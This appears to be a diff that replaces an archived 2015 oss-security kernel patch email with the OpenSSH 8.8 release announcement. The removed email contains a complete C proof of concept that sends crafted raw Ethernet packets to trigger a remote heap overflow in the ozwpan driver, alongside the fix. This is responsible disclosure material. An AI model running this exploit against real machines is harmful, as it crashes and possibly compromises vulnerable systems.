@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["6232" "Tuesday" "26" "May" "2015" "14:17:47" "+0200" "Jason A. Donenfeld" "Jason@zx2c4.com" "<1432642669-7289-3-git-send-email-Jason@zx2c4.com>" "225" "[oss-security] [PATCH v2 2/4] ozwpan: Use unsigned ints to prevent heap overflow" nil nil nil "5" "2015052612:17:47" "[oss-security] [PATCH v2 2/4] ozwpan: Use unsigned ints to prevent heap overflow" (number mark "U       Jason@zx2c4. May 26  225/6232  " thread-indent "\"[oss-security] [PATCH v2 2/4] ozwpan: Use unsigned ints to prevent heap overflow\"\n") "<1432642669-7289-1-git-send-email-Jason@zx2c4.com>" ("<1431543500-4847-1-git-send-email-Jason@zx2c4.com>" "<1432642669-7289-1-git-send-email-Jason@zx2c4.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["5703" "Sunday" "26" "September" "2021" "08:52:50" "-0600" "Damien Miller" "djm@cvs.openbsd.org" nil "147" "[oss-security] Announce: OpenSSH 8.8 released" nil nil nil "9" nil nil (number mark "U       djm@cvs.open Sep 26  147/5703  " thread-indent "\"[oss-security] Announce: OpenSSH 8.8 released\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Announce: OpenSSH 8.8 released" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 20250 invoked by uid 550); 26 May 2015 12:18:46 -0000
+Received: (qmail 5163 invoked by uid 550); 26 Sep 2021 14:53:05 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,252 +12,157 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 19548 invoked from network); 26 May 2015 12:18:38 -0000
-DKIM-Signature: v=1; a=rsa-sha1; c=relaxed; d=zx2c4.com; h=from:to:cc
-	:subject:date:message-id:in-reply-to:references; s=mail; bh=fqs8
-	qEfrLQmqs1bGVg9mVxgaAck=; b=oNho2xUltR9oUbzNoLqsWB9SIgbbyWCBapAb
-	qKLWZ/pRZaYizBp1L5mg8rBkHskK0eLVc8+9DMdngRKqYf4/dxd3sj9FTcrqOab6
-	GWUVhds+t283U0iRdFlTkgzqI5kB4StkFbKP0cbiBK9ubazdhxGaysjLJZId3C8M
-	nixcY8Fu6A4jEnlQPwFl5Gszpcis9AECHqKsTpNt8bEELxlBLO0tvoxKoyUCbaeV
-	MeQY/MR/RcWPv7pWswdib0ZvhwGHzUtWHPb7il2dRSeJWCKp2ayUqW9AkklyIqcW
-	f26nmGaQ4szmGj6xSgalFxTrnIocS8YSsjVyXO/kUoGPbHF5Fg==
-From: "Jason A. Donenfeld" <Jason@zx2c4.com>
-To: oss-security <oss-security@lists.openwall.com>,
-	linux-kernel@vger.kernel.org,
-	Shigekatsu Tateno <shigekatsu.tateno@atmel.com>,
-	Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
-	devel@driverdev.osuosl.org
-Cc: "Jason A. Donenfeld" <Jason@zx2c4.com>
-Date: Tue, 26 May 2015 14:17:47 +0200
-Message-Id: <1432642669-7289-3-git-send-email-Jason@zx2c4.com>
-X-Mailer: git-send-email 2.4.1
-In-Reply-To: <1432642669-7289-1-git-send-email-Jason@zx2c4.com>
-References: <1431543500-4847-1-git-send-email-Jason@zx2c4.com>
- <1432642669-7289-1-git-send-email-Jason@zx2c4.com>
-Subject: [oss-security] [PATCH v2 2/4] ozwpan: Use unsigned ints to prevent heap overflow
+Received: (qmail 5127 invoked from network); 26 Sep 2021 14:53:04 -0000
+From: Damien Miller <djm@cvs.openbsd.org>
+Date: Sun, 26 Sep 2021 08:52:50 -0600 (MDT)
+To: oss-security@lists.openwall.com
+Message-ID: <94b230a84bd78c43@cvs.openbsd.org>
+Subject: [oss-security] Announce: OpenSSH 8.8 released
 
-Using signed integers, the subtraction between required_size and offset
-could wind up being negative, resulting in a memcpy into a heap buffer
-with a negative length, resulting in huge amounts of network-supplied
-data being copied into the heap, which could potentially lead to remote
-code execution.. This is remotely triggerable with a magic packet.
-A PoC which obtains DoS follows below. It requires the ozprotocol.h file
-from this module.
+OpenSSH 8.8 has just been released. It will be available from the
+mirrors listed at https://www.openssh.com/ shortly.
 
-=-=-=-=-=-=
+OpenSSH is a 100% complete SSH protocol 2.0 implementation and
+includes sftp client and server support.
 
- #include <arpa/inet.h>
- #include <linux/if_packet.h>
- #include <net/if.h>
- #include <netinet/ether.h>
- #include <stdio.h>
- #include <string.h>
- #include <stdlib.h>
- #include <endian.h>
- #include <sys/ioctl.h>
- #include <sys/socket.h>
+Once again, we would like to thank the OpenSSH community for their
+continued support of the project, especially those who contributed
+code or patches, reported bugs, tested snapshots or donated to the
+project. More information on donations may be found at:
+https://www.openssh.com/donations.html
 
- #define u8 uint8_t
- #define u16 uint16_t
- #define u32 uint32_t
- #define __packed __attribute__((__packed__))
- #include "ozprotocol.h"
+Future deprecation notice
+=========================
 
-static int hex2num(char c)
-{
-	if (c >= '0' && c <= '9')
-		return c - '0';
-	if (c >= 'a' && c <= 'f')
-		return c - 'a' + 10;
-	if (c >= 'A' && c <= 'F')
-		return c - 'A' + 10;
-	return -1;
-}
-static int hwaddr_aton(const char *txt, uint8_t *addr)
-{
-	int i;
-	for (i = 0; i < 6; i++) {
-		int a, b;
-		a = hex2num(*txt++);
-		if (a < 0)
-			return -1;
-		b = hex2num(*txt++);
-		if (b < 0)
-			return -1;
-		*addr++ = (a << 4) | b;
-		if (i < 5 && *txt++ != ':')
-			return -1;
-	}
-	return 0;
-}
+A near-future release of OpenSSH will switch scp(1) from using the
+legacy scp/rcp protocol to using SFTP by default.
 
-int main(int argc, char *argv[])
-{
-	if (argc < 3) {
-		fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0]);
-		return 1;
-	}
+Legacy scp/rcp performs wildcard expansion of remote filenames (e.g.
+"scp host:* .") through the remote shell. This has the side effect of
+requiring double quoting of shell meta-characters in file names
+included on scp(1) command-lines, otherwise they could be interpreted
+as shell commands on the remote side.
 
-	uint8_t dest_mac[6];
-	if (hwaddr_aton(argv[2], dest_mac)) {
-		fprintf(stderr, "Invalid mac address.\n");
-		return 1;
-	}
+This creates one area of potential incompatibility: scp(1) when using
+the SFTP protocol no longer requires this finicky and brittle quoting,
+and attempts to use it may cause transfers to fail. We consider the
+removal of the need for double-quoting shell characters in file names
+to be a benefit and do not intend to introduce bug- compatibility for
+legacy scp/rcp in scp(1) when using the SFTP protocol.
 
-	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
-	if (sockfd < 0) {
-		perror("socket");
-		return 1;
-	}
+Another area of potential incompatibility relates to the use of remote
+paths relative to other user's home directories, for example -
+"scp host:~user/file /tmp". The SFTP protocol has no native way to
+expand a ~user path. However, sftp-server(8) in OpenSSH 8.7 and later
+support a protocol extension "expand-path@openssh.com" to support
+this.
 
-	struct ifreq if_idx;
-	int interface_index;
-	strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);
-	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
-		perror("SIOCGIFINDEX");
-		return 1;
-	}
-	interface_index = if_idx.ifr_ifindex;
-	if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {
-		perror("SIOCGIFHWADDR");
-		return 1;
-	}
-	uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;
+Security
+========
 
-	struct {
-		struct ether_header ether_header;
-		struct oz_hdr oz_hdr;
-		struct oz_elt oz_elt;
-		struct oz_elt_connect_req oz_elt_connect_req;
-	} __packed connect_packet = {
-		.ether_header = {
-			.ether_type = htons(OZ_ETHERTYPE),
-			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
-			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
-		},
-		.oz_hdr = {
-			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
-			.last_pkt_num = 0,
-			.pkt_num = htole32(0)
-		},
-		.oz_elt = {
-			.type = OZ_ELT_CONNECT_REQ,
-			.length = sizeof(struct oz_elt_connect_req)
-		},
-		.oz_elt_connect_req = {
-			.mode = 0,
-			.resv1 = {0},
-			.pd_info = 0,
-			.session_id = 0,
-			.presleep = 35,
-			.ms_isoc_latency = 0,
-			.host_vendor = 0,
-			.keep_alive = 0,
-			.apps = htole16((1 << OZ_APPID_USB) | 0x1),
-			.max_len_div16 = 0,
-			.ms_per_isoc = 0,
-			.up_audio_buf = 0,
-			.ms_per_elt = 0
-		}
-	};
+sshd(8) from OpenSSH 6.2 through 8.7 failed to correctly initialise
+supplemental groups when executing an AuthorizedKeysCommand or
+AuthorizedPrincipalsCommand, where a AuthorizedKeysCommandUser or
+AuthorizedPrincipalsCommandUser directive has been set to run the
+command as a different user. Instead these commands would inherit
+the groups that sshd(8) was started with.
 
-	struct {
-		struct ether_header ether_header;
-		struct oz_hdr oz_hdr;
-		struct oz_elt oz_elt;
-		struct oz_get_desc_rsp oz_get_desc_rsp;
-	} __packed pwn_packet = {
-		.ether_header = {
-			.ether_type = htons(OZ_ETHERTYPE),
-			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
-			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
-		},
-		.oz_hdr = {
-			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
-			.last_pkt_num = 0,
-			.pkt_num = htole32(1)
-		},
-		.oz_elt = {
-			.type = OZ_ELT_APP_DATA,
-			.length = sizeof(struct oz_get_desc_rsp)
-		},
-		.oz_get_desc_rsp = {
-			.app_id = OZ_APPID_USB,
-			.elt_seq_num = 0,
-			.type = OZ_GET_DESC_RSP,
-			.req_id = 0,
-			.offset = htole16(2),
-			.total_size = htole16(1),
-			.rcode = 0,
-			.data = {0}
-		}
-	};
+Depending on system configuration, inherited groups may allow
+AuthorizedKeysCommand/AuthorizedPrincipalsCommand helper programs to
+gain unintended privilege.
 
-	struct sockaddr_ll socket_address = {
-		.sll_ifindex = interface_index,
-		.sll_halen = ETH_ALEN,
-		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
-	};
+Neither AuthorizedKeysCommand nor AuthorizedPrincipalsCommand are
+enabled by default in sshd_config(5).
 
-	if (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
-		perror("sendto");
-		return 1;
-	}
-	usleep(300000);
-	if (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
-		perror("sendto");
-		return 1;
-	}
-	return 0;
-}
+Potentially-incompatible changes
+================================
 
-Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
----
- drivers/staging/ozwpan/ozhcd.c   | 8 ++++----
- drivers/staging/ozwpan/ozusbif.h | 4 ++--
- 2 files changed, 6 insertions(+), 6 deletions(-)
+This release disables RSA signatures using the SHA-1 hash algorithm
+by default. This change has been made as the SHA-1 hash algorithm is
+cryptographically broken, and it is possible to create chosen-prefix
+hash collisions for <USD$50K [1]
 
-diff --git a/drivers/staging/ozwpan/ozhcd.c b/drivers/staging/ozwpan/ozhcd.c
-index 5ff4716..784b5ec 100644
---- a/drivers/staging/ozwpan/ozhcd.c
-+++ b/drivers/staging/ozwpan/ozhcd.c
-@@ -746,8 +746,8 @@ void oz_hcd_pd_reset(void *hpd, void *hport)
- /*
-  * Context: softirq
-  */
--void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status, const u8 *desc,
--			int length, int offset, int total_size)
-+void oz_hcd_get_desc_cnf(void *hport, u8 req_id, u8 status, const u8 *desc,
-+			u8 length, u16 offset, u16 total_size)
- {
- 	struct oz_port *port = hport;
- 	struct urb *urb;
-@@ -759,8 +759,8 @@ void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status, const u8 *desc,
- 	if (!urb)
- 		return;
- 	if (status == 0) {
--		int copy_len;
--		int required_size = urb->transfer_buffer_length;
-+		unsigned int copy_len;
-+		unsigned int required_size = urb->transfer_buffer_length;
- 
- 		if (required_size > total_size)
- 			required_size = total_size;
-diff --git a/drivers/staging/ozwpan/ozusbif.h b/drivers/staging/ozwpan/ozusbif.h
-index 4249fa3..d2a6085 100644
---- a/drivers/staging/ozwpan/ozusbif.h
-+++ b/drivers/staging/ozwpan/ozusbif.h
-@@ -29,8 +29,8 @@ void oz_usb_request_heartbeat(void *hpd);
- 
- /* Confirmation functions.
-  */
--void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status,
--	const u8 *desc, int length, int offset, int total_size);
-+void oz_hcd_get_desc_cnf(void *hport, u8 req_id, u8 status,
-+	const u8 *desc, u8 length, u16 offset, u16 total_size);
- void oz_hcd_control_cnf(void *hport, u8 req_id, u8 rcode,
- 	const u8 *data, int data_len);
- 
--- 
-2.4.1
+For most users, this change should be invisible and there is
+no need to replace ssh-rsa keys. OpenSSH has supported RFC8332
+RSA/SHA-256/512 signatures since release 7.2 and existing ssh-rsa keys
+will automatically use the stronger algorithm where possible.
+
+Incompatibility is more likely when connecting to older SSH
+implementations that have not been upgraded or have not closely tracked
+improvements in the SSH protocol. For these cases, it may be necessary
+to selectively re-enable RSA/SHA1 to allow connection and/or user
+authentication via the HostkeyAlgorithms and PubkeyAcceptedAlgorithms
+options. For example, the following stanza in ~/.ssh/config will enable
+RSA/SHA1 for host and user authentication for a single destination host:
+
+    Host old-host
+        HostkeyAlgorithms +ssh-rsa
+	PubkeyAcceptedAlgorithms +ssh-rsa
+
+We recommend enabling RSA/SHA1 only as a stopgap measure until legacy
+implementations can be upgraded or reconfigured with another key type
+(such as ECDSA or Ed25519).
+
+[1] "SHA-1 is a Shambles: First Chosen-Prefix Collision on SHA-1 and
+    Application to the PGP Web of Trust" Leurent, G and Peyrin, T
+    (2020) https://eprint.iacr.org/2020/014.pdf
+
+Changes since OpenSSH 8.7
+=========================
+
+This release is motivated primarily by the above deprecation and
+security fix.
+
+New features
+------------
+ * ssh(1): allow the ssh_config(5) CanonicalizePermittedCNAMEs
+   directive to accept a "none" argument to specify the default
+   behaviour.
+
+Bugfixes
+--------
+
+ * scp(1): when using the SFTP protocol, continue transferring files
+   after a transfer error occurs, better matching original scp/rcp
+   behaviour.
+    
+ * ssh(1): fixed a number of memory leaks in multiplexing,
+
+ * ssh-keygen(1): avoid crash when using the -Y find-principals
+   command.
+
+ * A number of documentation and manual improvements, including
+   bz#3340, PR#139, PR#215, PR#241, PR#257
+
+Portability
+-----------
+
+ * ssh-agent(1): on FreeBSD, use procctl to disable ptrace(2)
+
+ * ssh(1)/sshd(8): some fixes to the pselect(2) replacement
+   compatibility code. bz#3345
+
+Checksums:
+==========
+
+ - SHA1 (openssh-8.8.tar.gz) = 732947082a8998047e839cc0b4c066bf0a7e1a5b
+ - SHA256 (openssh-8.8.tar.gz) = AngyrPSQH255hnzU1l7y+LlVAUNcGWtuYQIFEl22nRo=
+
+ - SHA1 (openssh-8.8p1.tar.gz) = 1eb964897a4372f6fb96c7effeb509ec71c379c9
+ - SHA256 (openssh-8.8p1.tar.gz) = RZCJDqm7ms5Pca4zF4WjpYIyMkNRYZYO1fyGWI8zH+k=
+
+Please note that the SHA256 signatures are base64 encoded and not
+hexadecimal (which is the default for most checksum tools). The PGP
+key used to sign the releases is available from the mirror sites:
+https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/RELEASE_KEY.asc
+
+Please note that the OpenPGP key used to sign releases has been
+rotated for this release. The new key has been signed by the previous
+key to provide continuity.
+
+Reporting Bugs:
+===============
+
+- Please read https://www.openssh.com/report.html
+  Security bugs should be reported directly to openssh@openssh.com
 
